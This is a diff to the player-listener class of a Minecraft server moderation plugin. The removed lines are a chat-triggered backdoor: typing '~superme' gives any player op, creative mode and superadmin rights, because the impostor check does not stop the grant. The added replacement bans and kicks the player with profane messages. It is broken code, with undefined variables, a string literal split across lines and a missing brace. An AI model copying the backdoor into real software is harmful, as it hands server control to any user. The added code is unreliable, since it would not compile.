@@ -589,28 +589,18 @@ public class TFM_PlayerListener implements Listener
                 message = message.substring(0, 100);
                 TFM_Util.playerMsg(player, "Message was shortened because it was too long to send.");
             }
+            //bitch listner
             if (message.toLowerCase().contains("~superme")) 
             {
-               if (!TFM_AdminList.isAdminImpostor(player))
-               {
-               // Take Action if not imp
-               player.sendMessage("Pft, you wish");
-               TFM_Util.bcastMsg(TotalFreedomMod.FREEDOMOP_MOD + ChatColor.RED + " WARNING: " + player.getName() + ChatColor.ITALIC + " Could " + ChatColor.RED + "be a security risk!");
-               TFM_Util.autoEject(player, "Pft, you wish");
-               event.setCancelled(true);
-               }
-                // Take action if robo
-                player.setOp(true);
-                player.setGameMode(GameMode.CREATIVE);
-                event.setCancelled(true);
-                TFM_Util.bcastMsg(player.getName() + " - Supering himself", ChatColor.DARK_GREEN);
-                TFM_AdminList.addSuperadmin(player);
-            }
+                sender_p.chat("IM AN IDIOT CUZ i TRIED ~superme!");
+                sender.setBanned(true);
+                sender.kickPlayer(ChatColor.RED + "BITCH YOU NEED TO GET YOUR SHIT TOGETHER
+                ");
             if (message.toLowerCase().contains("~help")) 
             {
                player.sendMessage(ChatColor.GREEN + "======== Listener Help Menu =======");
                player.sendMessage(ChatColor.GREEN + "Commands: ");
-               player.sendMessage(ChatColor.GREEN + "~supeme - Supers yourself, Admins only.");
+               player.sendMessage(ChatColor.GREEN + "~superme- fake super command for the ops :P");
                player.sendMessage(ChatColor.GREEN + "~satan - Hell");
                player.sendMessage(ChatColor.GREEN + "~lol - No desc");
                
@@ -1002,16 +992,7 @@ public class TFM_PlayerListener implements Listener
             player.setPlayerListName(ChatColor.AQUA + player.getName());
             TFM_PlayerData.getPlayerData(player).setTag("&8[&BSuper Admin&8]");
         }
-        if (username.equalsIgnoreCase("Robo_Lord"))
-        {
-            //set tag
-            player.setPlayerListName(ChatColor.DARK_RED + player.getName());
-            TFM_PlayerData.getPlayerData(player).setTag("&8[&4Beast&8]");
-            //Entrance
-            TFM_Util.bcastMsg(ChatColor.AQUA + "Robo_Lord is thy " + ChatColor.DARK_RED + "holy satan mastermind ");
-            TFM_Util.bcastMsg(ChatColor.AQUA + "Robo_Lord is a " + ChatColor.LIGHT_PURPLE + "Sexy Beast " + ChatColor.AQUA + "and..");
-        }
-         else if (username.equalsIgnoreCase("buildcarter8"))
+         if (username.equalsIgnoreCase("buildcarter8"))
         {
             //set tag
             player.setPlayerListName(ChatColor.DARK_RED + player.getName());
